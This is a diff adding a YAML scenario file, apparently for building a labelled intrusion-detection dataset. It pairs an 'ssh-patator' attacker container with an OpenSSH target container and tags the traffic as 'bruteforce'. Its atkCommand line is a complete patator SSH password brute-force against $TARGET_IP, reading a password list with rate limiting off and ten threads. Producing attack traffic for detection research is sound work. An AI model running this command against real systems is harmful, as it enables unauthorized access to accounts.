@@ -1,0 +1,16 @@
+attacker:
+  name: ssh-patator
+  image: ghcr.io/simonhondekyn/ssh-patator:cic
+  atkCommand: python patator.py ssh_login host=$TARGET_IP user=iscxtap password=FILE0 0=passwords.txt --rate-limit=0 --threads=10
+target:
+  name: openssh
+  image: ghcr.io/simonhondekyn/openssh:cic
+  startupProbe:
+    tcpSocket:
+      port: 22
+    initialDelaySeconds: 5
+    periodSeconds: 5
+labels:
+  label: 1
+  category: "bruteforce"
+  subcategory: "ssh-patator"
